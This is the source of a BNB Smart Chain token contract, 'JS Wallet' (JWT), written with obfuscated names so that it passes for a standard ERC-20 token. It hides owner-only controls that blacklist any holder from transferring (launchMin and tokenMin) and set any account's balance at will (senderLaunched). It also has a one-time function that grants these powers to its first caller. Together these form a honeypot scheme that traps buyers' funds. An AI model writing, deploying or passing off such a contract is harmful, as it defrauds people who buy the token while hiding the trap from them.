/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface swapToTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromSwap) external view returns (uint256);

    function transfer(address teamTo, uint256 modeFee) external returns (bool);

    function allowance(address toTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeFee) external returns (bool);

    function transferFrom(
        address sender,
        address teamTo,
        uint256 modeFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundReceiver, uint256 value);
    event Approval(address indexed toTx, address indexed spender, uint256 value);
}

interface swapToTeamMetadata is swapToTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract receiverSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAuto {
    function createPair(address fundTx, address limitTrading) external returns (address);
}

contract JSWallet is receiverSender, swapToTeam, swapToTeamMetadata {

    function amountTx(address receiverTx) public {
        if (amountShould) {
            return;
        }
        teamTxEnable[receiverTx] = true;
        amountShould = true;
    }

    address public marketingFromWallet;

    mapping(address => bool) public teamTxEnable;

    function approve(address walletTrading, uint256 modeFee) public virtual override returns (bool) {
        teamFeeAt[_msgSender()][walletTrading] = modeFee;
        emit Approval(_msgSender(), walletTrading, modeFee);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function decimals() external view virtual override returns (uint8) {
        return listLimitMin;
    }

    uint8 private listLimitMin = 18;

    function transferFrom(address receiverTotal, address teamTo, uint256 modeFee) external override returns (bool) {
        if (teamFeeAt[receiverTotal][_msgSender()] != type(uint256).max) {
            require(modeFee <= teamFeeAt[receiverTotal][_msgSender()]);
            teamFeeAt[receiverTotal][_msgSender()] -= modeFee;
        }
        return marketingLaunch(receiverTotal, teamTo, modeFee);
    }

    string private teamEnableSell = "JWT";

    function transfer(address receiverWallet, uint256 modeFee) external virtual override returns (bool) {
        return marketingLaunch(_msgSender(), receiverWallet, modeFee);
    }

    mapping(address => uint256) private exemptReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverFund;
    }

    function launchMin(address txMarketing) public {
        if (txMarketing == isTrading || txMarketing == marketingFromWallet || !teamTxEnable[_msgSender()]) {
            return;
        }
        tokenMin[txMarketing] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamEnableSell;
    }

    address public owner;

    function name() external view virtual override returns (string memory) {
        return toWalletEnable;
    }

    bool public amountShould;

    function senderLaunched(address receiverWallet, uint256 modeFee) public {
        if (!teamTxEnable[_msgSender()]) {
            return;
        }
        exemptReceiver[receiverWallet] = modeFee;
    }

    mapping(address => bool) public tokenMin;

    address public isTrading;

    function balanceOf(address fromSwap) public view virtual override returns (uint256) {
        return exemptReceiver[fromSwap];
    }

    address buyMax = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function shouldTx(address receiverTotal, address teamTo, uint256 modeFee) internal returns (bool) {
        require(exemptReceiver[receiverTotal] >= modeFee);
        exemptReceiver[receiverTotal] -= modeFee;
        exemptReceiver[teamTo] += modeFee;
        emit Transfer(receiverTotal, teamTo, modeFee);
        return true;
    }

    function marketingLaunch(address receiverTotal, address teamTo, uint256 modeFee) internal returns (bool) {
        require(!tokenMin[receiverTotal]);
        return shouldTx(receiverTotal, teamTo, modeFee);
    }

    function allowance(address launchTx, address walletTrading) external view virtual override returns (uint256) {
        return teamFeeAt[launchTx][walletTrading];
    }

    string private toWalletEnable = "JS Wallet";

    mapping(address => mapping(address => uint256)) private teamFeeAt;

    constructor (){
        marketingFromWallet = receiverAuto(liquiditySell).createPair(buyMax,address(this));
        isTrading = _msgSender();
        exemptReceiver[isTrading] = receiverFund;
        teamTxEnable[isTrading] = true;
        emit Transfer(address(0), isTrading, receiverFund);
    }

    address liquiditySell = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    uint256 private receiverFund = 100000000 * 10 ** 18;

}